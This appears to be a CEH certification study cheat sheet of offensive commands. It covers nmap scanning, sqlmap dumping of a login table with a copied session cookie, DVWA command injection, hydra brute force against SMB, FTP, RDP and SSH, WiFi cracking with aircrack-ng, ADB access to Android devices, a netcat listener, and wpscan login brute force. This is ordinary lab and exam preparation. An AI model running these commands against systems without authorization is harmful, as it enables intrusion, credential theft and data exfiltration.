
# CEH  – Cheat Sheet

---

## Sharing Files (Windows ↔ Linux)

Start simple HTTP server (Linux)

python3 -m http.server 8080

Download file from Windows

Certutil.exe -Urlcache -f http://<ParrotIP>/eg.jpg C:\path\to\save\file\eg.jpg

Download file from Linux

wget http://<Windows_IP>:8080/eg.jpg -O eg.jpg

---

## Find Files in Linux

Show directory tree

tree

Find files

sudo find / -name *.txt
sudo find / -name SpecificFileName.txt
sudo find /DirectoryName -name SpecificFileName.txt
sudo find . -name SpecificFileName.txt

---

To Sort = sort file.txt | uniq > new_file.txt 
nc -lnvp 1234

# Final Look (Quick Notes)

## Android Device Access

Check for port 5555

adb connect <TIP>:5555
adb pull sdcard/
python3 phonesploitpro.py

Navigation inside phonesploit

N → Next page
P → Previous page

---

## Identify Servers

Run aggressive scan

nmap -A -oN scan.txt <TIP>

Open results

mousepad scan.txt

---

## Find Domain Controller

Check ports

88/TCP  kerberos
389/TCP LDAP

If both open → likely Domain Controller.

Run aggressive scan for full info.

---

## Vulnerability Scan

nmap -Pn --script vuln <TIP> -T5

Alternative

OpenVAS

---

## SQL Injection

Use SQLMap

sqlmap

Get cookie from browser console

document.cookie

---

## Hash Cracking

Tools

online hash tools
hashcat
john

---

## DVWA Command Execution

Display file contents

Windows

| type "path"

Linux

| cat "path"

---

## WiFi Password Cracking

aircrack-ng -w wordlist.txt capture.cap

or

aircrack-ng -b <bssid> -w wifiPassList.txt handShakeCapture.cap

Find BSSID

aircrack-ng capture.cap

---

## Directory Bruteforce

dirb <targetDomain> -x eg.txt

---

## Malware Analysis

Access RAT

Theef → Client210.exe

Look for ports

9871
6703

Find entry point / linker info

PEiD

Entropy tools

DIE
ent



---

## Wireshark Analysis

Find packets by IP

Statistics → IPv4 → Source and Destination

Filters

tcp.flags.syn == 1
tcp.flags.syn == 1 && tcp.flags.ack == 0

Frame content search

frame contains "string"

Expert information

Analyze → Expert Info

IoT message filter

mqtt

---

## DoS Detection

Filters

tcp.flags.syn == 1 && tcp.flags.ack == 0
tcp.flags.syn == 1

Check conversations

Statistics → Conversations

Graph analysis

Statistics → I/O Graph

Traffic spikes may indicate attack.

---

## PE File Analysis

Entry point

PE Explorer

Cross check tools

DIE
PEiD


readpe filename
objdump -x filename

binwalk filename
exiftool filename
ent
strings
file

---

## Remote Login Ports

22 → SSH
23 → Telnet
3389 → RDP

---

## SMB Attacks

Crack credentials

hydra -L users.txt -P pass.txt <TIP> smb -f

List shares

smbmap -H <TIP>
smbclient -L <TIP>

Access share

smbclient //<TIP>/directory

Download files

get filename

---

## SSH Login

ssh user@<IP>

Privilege escalation

sudo -i

Reference

https://gtfobins.github.io/

---

## FTP Login

ftp <IP>

---

## RDP Login

xfreerdp /v:<TIP> /u:username

Alternative tool

remmina

---

## Hydra Brute Force

FTP

hydra -L users.txt -P passwords.txt ftp://<TIP> -f

RDP

hydra -L users.txt -P passwords.txt rdp://<TIP> -f

SSH custom port

hydra -L users.txt -P passwords.txt -s 2222 ssh://<TIP> -f

---

## CryptoForge Files

.cfe files are encrypted with CryptoForge

Decrypt

Right click → Decrypt → Enter password

---

## CRC32 Hash

Windows tool

HashMyFiles.exe

---

## Steganography

Tools

OpenStego
steghide

---

## BCTextEncoder

If BCTextEncoder was used

Use the same tool to decode.

---

## Double Encryption

Decrypt with password first
Then crack resulting hash.

---

## Base64 Decode

echo "aGVsbG8=" | base64 --decode

or

echo "aGVsbG8=" | base64 -d

Decode file

base64 -d Sniff.txt > secret.txt
cat secret.txt

---

## Hash Values

Multiple file hashing in Windows

HashMyFiles

Linux hashing

sha256sum file.txt
sha1sum file.txt

---

## SQL Injection Full Workflow

View Profile → Copy URL
Inspect Element → Console
document.cookie
Copy cookie value

Run sqlmap

sqlmap -u <url> --cookie <cookie> --dbs
sqlmap -u <url> --cookie <cookie> -D dbName --tables
sqlmap -u <url> --cookie <cookie> -D dbName -T Users_Login --dump

---

## WordPress Scanning

Basic scan

wpscan --url <domain or ip>

Bruteforce login

wpscan --url <domain or ip> -U user -P pass.txt

Enumerate users

wpscan --url <domain or ip> -e u

---

# END OF CHEAT SHEET
